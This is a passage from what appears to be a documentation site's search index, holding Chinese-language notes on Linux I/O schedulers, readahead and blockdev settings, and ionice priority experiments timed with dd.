\u5404\u4e2a\u8c03\u5ea6\u5668\u5728\u6570\u636e\u5e93\u5e94\u7528\u4e0b\u7684\u6027\u80fd\uff0c\u53ef\u4ee5\u770b\u51faCFQ\u7684\u6027\u80fd\u662f\u6bd4\u8f83\u5747\u8861\u7684 (\u7535\u68af\u5f0f\u8c03\u5ea6\u7a0b\u5e8f) \u54cd\u5e94\u5f88\u5feb\uff0cCPU\u4e0d\u7528\u8d39\u65f6\uff0c\u4f4e\u5f00\u9500\uff0c\u4e5f\u5c31\u662f\u4e0d\u7528\u8c03\u5ea6\u3002\u9002\u5408\u4e8eSSD\u78c1\u76d8\uff0c\u4e0d\u7528\u5408\u5e76\u3002\u00df \u9002\u5408\u4e8e\u865a\u62df\u673avirtualization guests\uff0c\u56e0\u4e3a\u5199\u6570\u636e\u6700\u7ec8\u662f\u865a\u62df\u673a\u7ba1\u7406\u5668\uff08\u4e0a\u5c42\uff09\u6765\u5199\uff0c\u6240\u4ee5\u865a\u62df\u673a\u4e0d\u9700\u8981\u8c03\u5ea6 Anticipatory(AS) Note AS \u8c03\u5ea6\u5668\u662f\u57fa\u4e8e Deadline \u8c03\u5ea6\u5668\uff0c\u52a0\u4e0a\u4e86\u4e00\u4e2a\u542f\u53d1\u5f0f\u7684\u300c\u9884\u6d4b\u300d\uff0c\u5047\u8bbe\u7cfb\u7edf\u4e2d\u6709\u5927\u91cf\u7684\u5199\u8bf7\u6c42\uff0c\u8fd9\u65f6\u5982\u679c\u5939\u6742\u51e0\u4e2a\u8bfb\u8bf7\u6c42\uff0c\u7531\u4e8e\u8bfb\u8bf7\u6c42\u7684\u8fc7\u671f\u65f6\u95f4\u77ed\uff0c\u8bfb\u8bf7\u6c42\u7acb\u5373\u5728\u591a\u4e2a\u5199\u8bf7\u6c42\u7684\u4e2d\u95f4\u4ea7\u751f\uff0c\u8fd9\u6837\u4f1a\u5bfc\u81f4\u78c1\u76d8\u7684\u6765\u56de\u5bfb\u9053\uff0cAS \u8bd5\u56fe\u51cf\u5c11\u5927\u91cf\u5199\u8bf7\u6c42\u5939\u6742\u5c11\u91cf\u8bfb\u8bf7\u6c42\u4ea7\u751f\u7684\u5bfb\u9053\u98ce\u66b4\uff08seek storm\uff09\u3002\u5f53\u4e00\u4e2a\u8bfb\u8bf7\u6c42\u5b8c\u6210\u540e\uff0cAS\u4e0d\u4f1a\u7acb\u5373\u8fd4\u56de\u5904\u7406\u961f\u5217\u4e2d\u7684\u5269\u4f59\u8bf7\u6c42\uff0c\u800c\u662f\u7b49\u5f85\u4e00\u4e2a\u9884\u6d4b\u65f6\u95f4\uff08\u9ed8\u8ba4\u4e3a 6ms\uff09\uff0c\u5982\u679c\u7b49\u5f85\u7684\u65f6\u95f4\u5185\u53d1\u751f\u4e86\u76f8\u90bb\u4f4d\u7f6e\u7684\u8bfb\u8bf7\u6c42\uff0c\u90a3\u4e48\u7acb\u5373\u5904\u7406\u8fd9\u4e2a\u76f8\u90bb\u4f4d\u7f6e\u7684\u8bfb\u8bf7\u6c42\uff0c\u518d\u8fd4\u56de\u5904\u7406\u961f\u5217\u4e2d\u7684\u8bf7\u6c42\uff0c\u8fd9\u6837\u53ef\u4ee5\u4f18\u5316\u591a\u4f59\u7684\u5bfb\u9053\u65f6\u95f4\u3002 \u5b83\u53ef\u4ee5\u4e3a\u8fde\u7eed IO \u8bf7\u6c42\uff08\u5982\u987a\u5e8f\u8bfb\uff09\u8fdb\u884c\u4e86\u4e00\u5b9a\u7684\u4f18\u5316\uff0c\u4f46\u662f\u5bf9\u4e8e\u968f\u673a\u8bfb\u7684\u573a\u666f AS \u4f1a\u4ea7\u751f\u8f83\u5927\u7684\u5ef6\u8fdf\uff0c\u5bf9\u4e8e\u6570\u636e\u5e93\u5e94\u7528\u5f88\u7cdf\u7cd5\uff0c\u800c\u5bf9\u4e8e Web Server \u53ef\u80fd\u4f1a\u8868\u73b0\u7684\u4e0d\u9519\u3002\u8fd9\u4e2a\u7b97\u6cd5\u4e5f\u53ef\u4ee5\u7b80\u5355\u7406\u89e3\u4e3a\u9762\u5411\u4f4e\u901f\u78c1\u76d8\u7684\uff0c\u5bf9\u4e8e\u4f7f\u7528\u4e86 TCG\uff08Tagged Command Queueing\uff09\u9ad8\u6027\u80fd\u7684\u78c1\u76d8\u548c RAID\uff0c\u4f7f\u7528 AS \u4f1a\u964d\u4f4e\u6027\u80fd\u3002 \u5728 Linux 2.6 - 2.6.18 AS \u662f\u5185\u6838\u9ed8\u8ba4\u8c03\u5ea6\u5668\uff0c\u7136\u800c\u5927\u591a\u6570\u7684\u4f01\u4e1a\u53d1\u884c\u7248\u9009\u62e9\u7684\u662f CFQ \u8c03\u5ea6\u5668\u3002 \u5230Linux 2.6.33 \u7248\u672c\uff0cAS \u88ab\u4ece\u5185\u6838\u4e2d\u79fb\u9664\uff0c\u56e0\u4e3a\u53ef\u4ee5\u901a\u8fc7\u8c03\u6574\u5176\u4ed6\u8c03\u5ea6\u5668\uff08\u5982 CFQ\uff09\u6765\u5b9e\u73b0\u4e0e\u5176\u76f8\u4f3c\u7684\u529f\u80fd\u3002","title":"NOOP(No Operation)"},{"location":"system/linux/IO/IO%20scheduler/#io_1","text":"","title":"\u67e5\u770b\u548c\u8bbe\u7f6eIO\u8c03\u5ea6\u7b97\u6cd5"},{"location":"system/linux/IO/IO%20scheduler/#_1","text":"[root@tuning ~]# cat /sys/block/sda/queue/scheduler noop anticipatory deadline [cfq] \u5e26\u4e2d\u62ec\u53f7\u7684\u5c31\u662f\u5f53\u524d\u7684\u8c03\u5ea6\u7b97\u6cd5","title":"\u67e5\u770b"},{"location":"system/linux/IO/IO%20scheduler/#_2","text":"[root@tuning ~]# echo deadline > /sys/block/sda/queue/scheduler [root@tuning ~]# cat /sys/block/sda/queue/scheduler noop anticipatory [deadline] cfq","title":"\u4e34\u65f6\u4fee\u6539"},{"location":"system/linux/IO/IO%20scheduler/#_3","text":"\u4fee\u6539\u5185\u6838\u53c2\u6570\uff0c\u52a0\u4e0aelevator=\u8c03\u5ea6\u7b97\u6cd5\u7684\u540d\u5b57 [root@tuning ~]$ /boot/grub/grub.conf kernel /vmlinuz-2.6.32-642.el6.x86_64 ro root=UUID=b4ae497b-f17c-4e10-9680-ae73fd033824 vga=791 elevator=deadline #vga=791 \uff1a \u5206\u8fa8\u7387 1024*768 [root@tuning ~]$ reboot [root@tuning ~]$ cat /sys/block/sda/queue/scheduler noop anticipatory [deadline] cfq","title":"\u6c38\u4e45\u4fee\u6539\u8c03\u5ea6\u7b97\u6cd5"},{"location":"system/linux/IO/IO%20scheduler/#_4","text":"","title":"\u8c03\u5ea6\u7b97\u6cd5\u7684\u53c2\u6570"},{"location":"system/linux/IO/IO%20scheduler/#_5","text":"[root@tuning ~]# ls /sys/block/sda/queue/","title":"\u9002\u5408\u6240\u6709\u8c03\u5ea6\u7b97\u6cd5\u7684\u53c2\u6570"},{"location":"system/linux/IO/IO%20scheduler/#a","text":"nr_requests [root@tuning ~]# cd /sys/block/sda/queue/ [root@tuning queue]# cat nr_requests 128 \u5373128\u4e2a\u8bf7\u6c42 b\u3001read-ahead \u9884\u8bfb","title":"a\u3001\u961f\u5217\u7684\u957f\u5ea6"},{"location":"system/linux/IO/IO%20scheduler/#bread-ahead","text":"Linux \u628a\u8bfb\u6a21\u5f0f\u5206\u4e3a\u968f\u673a\u8bfb\u548c\u987a\u5e8f\u8bfb\u4e24\u5927\u7c7b\uff0c\u5e76\u53ea\u5bf9\u987a\u5e8f\u8bfb\u8fdb\u884c\u9884\u8bfb\u3002\u8fd9\u4e00\u539f\u5219\u76f8\u5bf9\u4fdd\u5b88\uff0c\u4f46\u662f\u53ef\u4ee5\u4fdd\u8bc1\u5f88\u9ad8\u7684\u9884\u8bfb\u547d\u4e2d\u7387\u3002 \u4e3a\u4e86\u4fdd\u8bc1\u9884\u8bfb\u547d\u4e2d\u7387\uff0cLinux\u53ea\u5bf9\u987a\u5e8f\u8bfb (sequential read) \u8fdb\u884c\u9884\u8bfb\u3002\u5185\u6838\u901a\u8fc7\u9a8c\u8bc1\u5982\u4e0b\u4e24\u4e2a\u6761\u4ef6\u6765\u5224\u5b9a\u4e00\u4e2a read() \u662f\u5426\u987a\u5e8f\u8bfb\uff1a \u8fd9\u662f\u6587\u4ef6\u88ab\u6253\u5f00\u540e\u7684\u7b2c\u4e00\u6b21\u8bfb\uff0c\u5e76\u4e14\u8bfb\u7684\u662f\u6587\u4ef6\u9996\u90e8\uff1b \u5f53\u524d\u7684\u8bfb\u8bf7\u6c42\u4e0e\u524d\u4e00\uff08\u8bb0\u5f55\u7684\uff09\u8bfb\u8bf7\u6c42\u5728\u6587\u4ef6\u5185\u7684\u4f4d\u7f6e\u662f\u8fde\u7eed\u7684\u3002 \u5982\u679c\u4e0d\u6ee1\u8db3\u4e0a\u8ff0\u987a\u5e8f\u6027\u6761\u4ef6\uff0c\u5c31\u5224\u5b9a\u4e3a\u968f\u673a\u8bfb\u3002\u4efb\u4f55\u4e00\u4e2a\u968f\u673a\u8bfb\u90fd\u5c06\u7ec8\u6b62\u5f53\u524d\u7684\u987a\u5e8f\u5e8f\u5217\uff0c\u4ece\u800c\u7ec8\u6b62\u9884\u8bfb\u884c\u4e3a\uff08\u800c\u4e0d\u662f\u7f29\u51cf\u9884\u8bfb\u5927\u5c0f\uff09\u3002 \u9884\u8bfb\u7a97\u53e3 Linux\u91c7\u7528\u4e86\u4e00\u4e2a\u5feb\u901f\u7684\u7a97\u53e3\u6269\u5f20\u8fc7\u7a0b \u2022 \u9996\u6b21\u9884\u8bfb\uff1a readahead_size = read_size * 2 // or *4 \u9884\u8bfb\u7a97\u53e3\u7684\u521d\u59cb\u503c\u662f\u8bfb\u5927\u5c0f\u7684\u4e8c\u5230\u56db\u500d\u3002\u8fd9\u610f\u5473\u7740\u5728\u60a8\u7684\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u8f83\u5927\u7684\u8bfb\u7c92\u5ea6\uff08\u6bd4\u598232KB\uff09\u53ef\u4ee5\u7a0d\u7a0d\u63d0\u5347I/O\u6548\u7387\u3002 \u2022 \u540e\u7eed\u9884\u8bfb\uff1areadahead_size *= 2 \u540e\u7eed\u7684\u9884\u8bfb\u7a97\u53e3\u5c06\u9010\u6b21\u500d\u589e\uff0c\u76f4\u5230\u8fbe\u5230\u7cfb\u7edf\u8bbe\u5b9a\u7684\u6700\u5927\u9884\u8bfb\u5927\u5c0f\uff0c\u5176\u7f3a\u7701\u503c\u662f 256KB \u67e5\u770b\u548c\u4fee\u6539\u9884\u8bfb\u7a97\u53e3 $ blockdev --getra device \u662f/sys/block/$device/queue/read_ahead_kb \u7684\u4e8c\u500d $ blockdev --setra N device \u6216\u8005\u76f4\u63a5\u4fee\u6539\u7cfb\u7edf\u53c2\u6570 [root@tuning queue]# echo 4096 > /sys/block/sda/queue/read_ahead_kb [root@tuning queue]# cat /sys/block/sda/queue/read_ahead_kb //\u5176\u503c\u8c03\u62100\uff0c\u5173\u95ed\u4e86\u9884\u8bfb\u673a\u5236\u3002 4096 [root@tuning queue]# blockdev --getra /dev/sda 8192","title":"b\u3001read-ahead \u9884\u8bfb"},{"location":"system/linux/IO/IO%20scheduler/#blockdev","text":"[root@localhost ~]# blockdev \u7528\u6cd5\uff1a blockdev -V blockdev --report [\u8bbe\u5907] blockdev [-v|-q] \u547d\u4ee4 \u8bbe\u5907 \u53ef\u7528\u547d\u4ee4\u6709\uff1a --getsz \u83b7\u5f97 512-\u5b57\u8282\u6247\u533a\u7684\u5927\u5c0f --setro \u8bbe\u7f6e\u53ea\u8bfb --setrw \u8bbe\u7f6e\u8bfb\u5199 --getro \u83b7\u5f97\u53ea\u8bfb --getdiscardzeroes \u83b7\u53d6 \u5ffd\u7565\u96f6\u6570\u636e \u652f\u6301\u72b6\u6001 --getss \u83b7\u5f97\u903b\u8f91\u5757(\u6247\u533a)\u5927\u5c0f --getpbsz \u83b7\u5f97\u7269\u7406\u5757(\u6247\u533a)\u5927\u5c0f --getiomin \u83b7\u5f97\u6700\u5c0f I/O \u5927\u5c0f --getioopt \u83b7\u5f97\u6700\u4f18 I/O \u5927\u5c0f --getalignoff \u83b7\u5f97\u5bf9\u9f50\u504f\u79fb\u5b57\u8282\u6570 --getmaxsect \u83b7\u5f97\u6bcf\u6b21\u8bf7\u6c42\u7684\u6700\u5927\u6247\u533a\u6570 --getbsz \u83b7\u5f97\u5757\u5927\u5c0f --setbsz <bytes> set blocksize on file descriptor opening the block device --getsize \u83b7\u5f97 32-bit \u6247\u533a\u6570\u91cf(\u5df2\u5e9f\u5f03\uff0c\u8bf7\u4f7f\u7528 --getsz) --getsize64 \u83b7\u5f97\u5b57\u8282\u5927\u5c0f --setra <sectors> \u8bbe\u7f6e readahead --getra \u83b7\u53d6 readahead --setfra <sectors> \u8bbe\u7f6e\u6587\u4ef6\u7cfb\u7edf readahead --getfra \u83b7\u53d6\u6587\u4ef6\u7cfb\u7edf readahead --flushbufs \u5237\u65b0\u7f13\u5b58 --rereadpt \u91cd\u65b0\u8bfb\u53d6\u5206\u533a\u8868 \u200b \u200b","title":"blockdev\u547d\u4ee4"},{"location":"system/linux/IO/IO%20scheduler/#_6","text":"Deadline\u53c2\u6570 /sys/block//queue/iosched/writes_starved \u8fdb\u884c\u4e00\u4e2a\u5199\u64cd\u4f5c\u4e4b\u524d\uff0c\u5141\u8bb8\u8fdb\u884c\u591a\u5c11\u6b21\u8bfb\u64cd\u4f5c /sys/block//queue/iosched/read_expire \u8bfb\u8bf7\u6c42\u7684\u8fc7\u671f\u65f6\u95f4 /sys/block//queue/iosched/read_expire \u5199\u8bf7\u6c42\u7684\u8fc7\u671f\u65f6\u95f4\uff0c\u9ed8\u8ba4\u4e3a 500ms /sys/block/sda/queue/iosched/front_merges \u662f\u5426\u8fdb\u884c\u524d\u5408\u5e76 Anticipatory\u53c2\u6570 /sys/block//queue/iosched/antic_expire \u9884\u6d4b\u7b49\u5f85\u65f6\u957f\uff0c\u9ed8\u8ba4\u4e3a 6ms /sys/block//queue/iosched/{write_expire,read_expire} \u8bfb\u5199\u8bf7\u6c42\u7684\u8d85\u65f6\u65f6\u957f /sys/block//queue/iosched/{write_batch_expire,read_batch_expire} \u8bfb\u5199\u7684\u6279\u91cf\u5904\u7406\u65f6\u957f CFQ\u53c2\u6570 /sys/block//queue/iosched/slice_idle \u5f53\u4e00\u4e2a\u8fdb\u7a0b\u7684\u961f\u5217\u88ab\u5206\u914d\u5230\u65f6\u95f4\u7247\u5374\u6ca1\u6709 IO \u8bf7\u6c42\u65f6\uff0c\u8c03\u5ea6\u5668\u5728\u8f6e\u8be2\u81f3\u4e0b\u4e00\u4e2a\u961f\u5217\u4e4b\u524d\u7684\u7b49\u5f85\u65f6\u95f4\uff0c\u4ee5\u63d0\u5347 IO \u7684\u5c40\u90e8\u6027\uff0c\u5bf9\u4e8e SSD \u8bbe\u5907\uff0c\u53ef\u4ee5\u5c06\u8fd9\u4e2a\u503c\u8bbe\u4e3a 0\u3002 /sys/block//queue/iosched/quantum \u4e00\u4e2a\u8fdb\u7a0b\u7684\u961f\u5217\u6bcf\u6b21\u88ab\u5904\u7406 IO \u8bf7\u6c42\u7684\u6700\u5927\u6570\u91cf\uff0c\u9ed8\u8ba4\u4e3a 4\uff0cRHEL6 \u4e3a 8\uff0c\u589e\u5927\u8fd9\u4e2a\u503c\u53ef\u4ee5\u63d0\u5347\u5e76\u884c\u5904\u7406 IO \u7684\u6027\u80fd\uff0c\u4f46\u53ef\u80fd\u4f1a\u9020\u6210\u67d0\u4e9b IO \u5ef6\u8fdf\u95ee\u9898\u3002 /sys/block//queue/iosched/slice_async_rq \u4e00\u6b21\u5904\u7406\u5199\u8bf7\u6c42\u7684\u6700\u5927\u6570 /sys/block//queue/iosched/low_latency \u5982\u679cIO\u5ef6\u8fdf\u7684\u95ee\u9898\u5f88\u4e25\u91cd\uff0c\u5c06\u8fd9\u4e2a\u503c\u8bbe\u4e3a 1 CFQ \u7684\u8fdb\u7a0b IO \u4f18\u5148\u7ea7\u548c\u8fdb\u7a0b CPU \u4f18\u5148\u7ea7\u662f\u72ec\u7acb\u7684\u3002\u4f7f\u7528 ionice \u8c03\u6574\u8fdb\u7a0b\u4f18\u5148\u7ea7\uff0c\u6709\u4e09\u79cd\u8c03\u5ea6\u7c7b\u578b\u53ef\u4ee5\u9009\u62e9","title":"\u5404\u4e2a\u8c03\u5ea6\u7b97\u6cd5\u7684\u53c2\u6570"},{"location":"system/linux/IO/IO%20scheduler/#_7","text":"Class1(RTreal-time)\uff1a\u5b9e\u65f6 \u5b50\u4f18\u7ea70-7\uff0c\u6570\u5b57\u8d8a\u5c0f0\uff08\u6700\u9ad8\uff09\uff0c\u8d8a\u59277\uff08\u6700\u4f4e\uff09 Real time \u8fd9\u4e2a\u8c03\u5ea6\u7ea7\u522b\u7684\u8fdb\u7a0b\u4ea7\u751f\u7684IO\u88ab\u4f18\u5148\u5904\u7406\uff0c\u8fd9\u4e2a\u8c03\u5ea6\u7c7b\u578b\u5e94\u5c0f\u5fc3\u4f7f\u7528\uff0c\u9632\u6b62\u997f\u6b7b\u5176\u4ed6\u8fdb\u7a0bIO, \u5b83\u4e5f\u67098\u4e2a\u4f18\u5148\u7ea7\uff0c\u6570\u5b57\u8d8a\u5927\u5206\u7684\u7684IO\u65f6\u95f4\u7247\u8d8a\u957f Class2(BE best-effort): \u6700\u4f73\u6548\u679c\uff0c\u90fd\u80fd\u8bbf\u95ee \u9ed8\u8ba4 \u5b50\u4f18\u7ea70-7\uff0c\u6570\u5b57\u8d8a\u5c0f0\uff08\u6700\u9ad8\uff09\uff0c\u8d8a\u59277\uff08\u6700\u4f4e\uff09 Best-effort \u8fd9\u4e2a\u7c7b\u578b\u5171\u6709 8 \u4e2a\u4f18\u5148\u7ea7\uff0c\u5206\u522b\u4e3a 0-7\uff0c\u6570\u5b57\u8d8a\u4f4e\uff0c\u4f18\u5148\u7ea7\u8d8a\u9ad8\uff0c\u76f8\u540c\u7ea7\u522b\u7684\u4f18\u5148\u7ea7\u4f7f\u7528\u8f6e\u8be2\u7684\u65b9\u5f0f\u5904\u7406\u3002\u9002\u7528\u4e8e\u666e\u901a\u7684\u8fdb\u7a0b\u3002 \u57282.6.26\u4e4b\u524d\uff0c\u6ca1\u6709\u6307\u5b9a\u8c03\u5ea6\u7c7b\u578b\u7684\u8fdb\u7a0b\u4f7f\u7528\"none\" \u8c03\u5ea6\u7c7b\u578b\uff0cIO\u8c03\u5ea6\u5668\u5c06\u5176\u89c6\u4f5cBest-effort\u8fdb\u884c\u5904\u7406\uff0c\u8fd9\u4e2a\u7c7b\u522b\u4e2d\u8fdb\u7a0b\u4f18\u5148\u7ea7\u7531CPU\u4f18\u5148\u7ea7\u8ba1\u7b97\u5f97\u6765\uff1aio_priority = (cpu_nice + 20) / 5 2.6.26\u4e4b\u540e\uff0c\u6ca1\u6709\u6307\u5b9a\u8c03\u5ea6\u7c7b\u578b\u7684\u8fdb\u7a0b\u5c06\u4eceCPU\u8c03\u5ea6\u7c7b\u578b\u7ee7\u627f\u800c\u6765\uff0c\u8fd9\u4e2a\u7c7b\u522b\u7684\u4f18\u5148\u7ea7\u4ecd\u6309\u7167CPU\u4f18\u5148\u7ea7\u8ba1\u7b97\u800c\u6765\uff1aio_priority = (cpu_nice + 20) / 5 Class3(idle)\uff1a\u7a7a\u95f2 idle \u53ea\u6709\u5728\u6ca1\u6709\u66f4\u9ad8\u4f18\u5148\u7ea7\u7684\u8fdb\u7a0b\u4ea7\u751f IO \u65f6\uff0cidle \u624d\u53ef\u4ee5\u4f7f\u7528\u78c1\u76d8 IO\uff0c\u9002\u7528\u4e8e\u54ea\u4e9b\u4e0d\u91cd\u8981\u7684\u7a0b\u5e8f\uff08\u5982 updatedb\uff09\uff0c\u8ba9\u5b83\u4eec\u5728\u78c1\u76d8\u7a7a\u95f2\u65f6\u518d\u4ea7\u751f IO \u5728cfq\u8c03\u5ea6\u7b97\u6cd5\u4e0b\uff0cionice \u7528\u4e8e\u8bbe\u7f6e\u6216\u66f4\u6539\u5206\u7c7b # ionice -p PID # ionice -c3 -p PID # ionice -c1 -n0 dd if=/dev/sda of=/dev/null \u5b9e\u9a8c\u4e00\uff1a 1\u3001\u5148\u51c6\u5907\u4e09\u4e2a\u6587\u4ef6 [root@tuning iosched]# dd if=/dev/zero of=/bigfile1 bs=1M count=1000 [root@tuning iosched]# dd if=/dev/zero of=/bigfile2 bs=1M count=1000 [root@tuning iosched]# dd if=/dev/zero of=/bigfile3 bs=1M count=1000 [root@tuning iosched]# iotop rt: real time be\uff1a best-effort idle: idle [root@tuning ~]# echo 3 > /proc/sys/vm/drop_caches [root@tuning ~]# free -m \u7ec8\u7aef\u4e00\uff1a\u770b\u8c01\u4f7f\u7528\u78c1\u76d8 [root@tuning iosched]# iotop [root@tuning ~]# useradd user1 [root@tuning ~]# useradd user2 [root@tuning ~]# useradd user3 \u7ec8\u7aef\u4e8c\uff1a\u7528user1 \u2014\u2014 C3\u6ca1\u6709\u5b50\u4f18\u5148\u7ea7 [user1@tuning ~]$ time ionice -c3 dd if=/bigfile3 of=/dev/null 2048000+0 records in 2048000+0 records out 1048576000 bytes (1.0 GB) copied, 26.8628 s, 39.0 MB/s real 0m26.969s user 0m0.295s sys 0m5.140s \u7ec8\u7aef\u4e09\uff1a\u7528user2 \u2014\u2014 C2\u9ed8\u8ba4\uff0c\u53ef\u4ee5\u4e0d\u5199\uff0c\u9ed8\u8ba4\u5b50\u4f18\u5148\u7ea7\u662f4 [root@tuning ~]# su - user2 [user2@tuning ~]$ time ionice -c2 dd if=/bigfile2 of=/dev/null 2048000+0 records in 2048000+0 records out 1048576000 bytes (1.0 GB) copied, 15.5757 s, 67.3 MB/s real 0m15.609s user 0m0.167s sys 0m7.785s \u7ec8\u7aef\u56db\uff1aroot \u2014\u2014 //\u9ed8\u8ba4\u5b50\u4f18\u5148\u7ea7\u4e3a4\uff0cc1\u5f3a\u52bf [root@tuning ~]# time ionice -c1 dd if=/bigfile1 of=/dev/null real 0m12.610s user 0m0.252s sys 0m8.938s \u5b9e\u9a8c\u4e8c\uff1a\u5206\u7c7b\u76f8\u540c\uff0c\u4f18\u5148\u7ea7\u4e0d\u540c 0~7 \u7ec8\u7aef\u4e8c\uff1a [user1@tuning ~]$ time ionice -c2 -n0 dd if=/bigfile3 of=/dev/null 2048000+0 records in 2048000+0 records out 1048576000 bytes (1.0 GB) copied, 15.5433 s, 67.5 MB/s real 0m15.616s user 0m0.159s sys 0m6.947s \u7ec8\u7aef\u4e09\uff1a [user2@tuning ~]$ time ionice -c2 -n7 dd if=/bigfile2 of=/dev/null [user2@tuning ~]$ time ionice -c2 -n7 dd if=/bigfile2 of=/dev/null 2048000+0 records in 2048000+0 records out 1048576000 bytes (1.0 GB) copied, 23.3753 s, 44.9 MB/s real 0m23.399s user 0m0.258s sys 0m7.202s \u5b9e\u9a8c\u4e09\uff1a\u8c03\u6574\u5df2\u7ecf\u8fd0\u884c\u7684\u8fdb\u7a0b\u7684io\u8c03\u5ea6\u7b97\u6cd5\u5206\u7c7b\u53ca\u4f18\u5148\u7ea7\u7b49 \u6807\u7b7e\u4e00\uff1a [root@tuning ~]# dd if=/dev/zero of=/testfile \u6807\u7b7e\u4e8c\uff1a [root@tuning iosched]# iotop \u6807\u7b7e\u4e09\uff1a [root@tuning ~]# ps -ef | grep dd root 3028 2230 31 16:51 pts/3 00:00:09 dd if=/dev/zero of=/testfile root 3033 2229 0 16:51 pts/1 00:00:00 grep dd [root@tuning ~]# ionice -c3 -p 3028","title":"\u57fa\u4e8e\u5206\u7c7b\uff0c\u4f18\u5148\u7ea7\u961f\u5217"},{"location":"system/linux/IO/IO%E4%BC%98%E5%8C%96%E5%BB%BA%E8%AE%AE/","text":"IO\u4f18\u5316\u5efa\u8bae","title":"IO\u4f18\u5316\u5efa\u8bae"},{"location":"system/linux/IO/IO%E6%8A%80%E6%9C%AF%E6%A0%88/","text":"I/O\u6808 \u63d0\u4f9b\u4e86\u8f6f\u4ef6\u4e0e\u5176\u5b83\u6570\u636e\u5b58\u50a8\u4ecb\u8d28\u4ea4\u6362\u6570\u636e\u7684\u80fd\u529b Linux\u7cfb\u7edfI/O\u6808\u4e3b\u8981\u5305\u62ec\u78c1\u76d8\u548c\u6587\u4ef6\u7cfb\u7edf\uff1a 1.\u78c1\u76d8\uff1a\u4e3a\u7cfb\u7edf\u6570\u636e\u63d0\u4f9b\u6301\u4e45\u5316\u5b58\u50a8\uff0c\u5728linux\u7cfb\u7edf\u4e2d\u78c1\u76d8\u662f\u4f5c\u4e3a\u4e00\u4e2a\u5757\u8bbe\u5907\u6765\u7ba1\u7406\u7684\uff0c\u4ee5\u5757\u4e3a\u5355\u4f4d\u8bfb\u5199\u6570\u636e\uff0c\u901a\u5e38\u5305\u62ec\u672c\u5730\u78c1\u76d8\u8bbe\u5907\u548c\u7f51\u7edc\u5b58\u50a8 2.\u6587\u4ef6\u7cfb\u7edf\uff1a\u63d0\u4f9b\u7ba1\u7406\u7cfb\u7edf\u6587\u4ef6\u7684\u6811\u72b6\u7ed3\u6784\uff0c\u5728linux\u7cfb\u7edf\u4e2d\uff0c\u4e00\u5207\u7686\u6587\u4ef6\uff0c\u666e\u901a\u7684\u6587\u4ef6\u3001\u76ee\u5f55\u3001\u5757\u8bbe\u5907\u3001\u5957\u63a5\u5b57\u4ee5\u53ca\u7ba1\u9053\u90fd\u662f\u901a\u8fc7\u7edf\u4e00\u7684\u6587\u4ef6\u7cfb\u7edf\u7ba1\u7406\uff0c\u6587\u4ef6\u7cfb\u7edf\u4e3a\u6bcf\u4e2a\u6587\u4ef6\u90fd\u5206\u914d\u4e00\u4e2a\u7d22\u5f15\u8282\u70b9\u53ca\u4e00\u4e2a\u76ee\u5f55\u9879\u6570\u636e\u7ed3\u6784\uff0c\u7528\u6765\u8bb0\u5f55\u6587\u4ef6\u7684\u5143\u4fe1\u606f\u53ca\u76ee\u5f55\u7ed3\u6784\uff1a \u7d22\u5f15\u8282\u70b9\uff1ainode\u7528\u6765\u8bb0\u5f55\u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u4fee\u6539\u65e5\u671f\uff0c\u8bbf\u95ee\u6743\u9650\u3001\u6570\u636e\u4f4d\u7f6e\u7b49\u5143\u4fe1\u606f\uff0cinode\u8ddf\u6587\u4ef6\u4e00\u4e00\u5bf9\u5e94\uff0cinode\u4fe1\u606f\u4e5f\u8981\u6301\u4e45\u5316\u5b58\u50a8\u5230\u78c1\u76d8 \u76ee\u5f55\u9879\u7ed3\u6784\uff1adentry\u7528\u6765\u8bb0\u5f55\u6587\u4ef6\u7684\u540d\u5b57\u3001\u7d22\u5f15\u8282\u70b9\u6307\u9488\u4ee5\u53ca\u4e0e\u5176\u4ed6\u76ee\u5f55\u9879\u7684\u5173\u8054\u5173\u7cfb\uff0c\u76ee\u5f55\u9879\u5b58\u50a8\u5728\u5185\u5b58\u4e2d \u6362\u53e5\u8bdd\u8bf4\uff0c\u7d22\u5f15\u8282\u70b9\u662f\u6bcf\u4e2a\u6587\u4ef6\u7684\u552f\u4e00\u6807\u5fd7\uff0c\u800c\u76ee\u5f55\u9879\u7ef4\u62a4\u7684\u6b63\u662f\u6587\u4ef6\u7cfb\u7edf\u7684\u6811\u72b6\u7ed3\u6784\u3002\u76ee\u5f55\u9879\u548c\u7d22\u5f15\u8282\u70b9\u7684\u5173\u7cfb\u662f\u591a\u5bf9\u4e00\uff0c\u4f60\u53ef\u4ee5\u7b80\u5355\u7406\u89e3\u4e3a\uff0c\u4e00\u4e2a\u6587\u4ef6\u53ef\u4ee5\u6709\u591a\u4e2a\u522b\u540d\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u901a\u8fc7\u786c\u94fe\u63a5\u4e3a\u6587\u4ef6\u521b\u5efa\u7684\u522b\u540d\uff0c\u5c31\u4f1a\u5bf9\u5e94\u4e0d\u540c\u7684\u76ee\u5f55\u9879\uff0c\u4e0d\u8fc7\u8fd9\u4e9b\u76ee\u5f55\u9879\u672c\u8d28\u4e0a\u8fd8\u662f\u94fe\u63a5\u540c\u4e00\u4e2a\u6587\u4ef6\uff0c\u6240\u4ee5\uff0c\u5b83\u4eec\u7684\u7d22\u5f15\u8282\u70b9\u76f8\u540c\u3002 \u7d22\u5f15\u8282\u70b9\u548c\u76ee\u5f55\u9879\u7eaa\u5f55\u4e86\u6587\u4ef6\u7684\u5143\u6570\u636e\uff0c\u4ee5\u53ca\u6587\u4ef6\u95f4\u7684\u76ee\u5f55\u5173\u7cfb\uff0c\u90a3\u4e48\u5177\u4f53\u6765\u8bf4\uff0c\u6587\u4ef6\u6570\u636e\u5230\u5e95\u662f\u600e\u4e48\u5b58\u50a8\u7684\u5462\uff1f\u662f\u4e0d\u662f\u76f4\u63a5\u5199\u5230\u78c1\u76d8\u4e2d\u5c31\u597d\u4e86\u5462\uff1f \u5b9e\u9645\u4e0a\uff0c\u78c1\u76d8\u8bfb\u5199\u7684\u6700\u5c0f\u5355\u4f4d\u662f\u6247\u533a\uff0c\u7136\u800c\u6247\u533a\u53ea\u6709 512B 